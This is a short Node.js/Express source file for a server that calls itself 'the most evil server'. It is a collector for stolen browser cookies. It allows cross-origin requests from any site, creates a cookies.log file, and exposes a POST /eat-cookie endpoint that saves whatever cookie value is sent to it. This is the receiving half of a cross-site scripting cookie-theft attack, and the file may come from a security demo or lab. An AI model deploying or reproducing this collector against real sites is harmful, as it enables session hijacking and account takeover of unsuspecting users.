import { Worker } from "./worker";
import express from "express";
const http = require("http");
const fs = require("fs");

require("dotenv").config();
const app = express();
const worker = new Worker();

var cors = require("cors");

const PORT = 4500;

app.use(express.json());
app.use(cors());
app.use(`/public`, express.static("./public"));

http.createServer(app).listen(PORT, () => {
  const cookies = "./cookies.log";

  try {
    fs.readFileSync(cookies);
  } catch (error) {
    fs.writeFileSync(cookies, "");
  }

  console.log(`The most evil server has started successfully on port ${PORT}.`);
});

app.post("/eat-cookie", function (req, res) {
  worker.saveCookie(req.body.cookie);
  res.send("😋🍪");
});

app.all("*", function (req, res) {
  res.send("😛🍪");
});
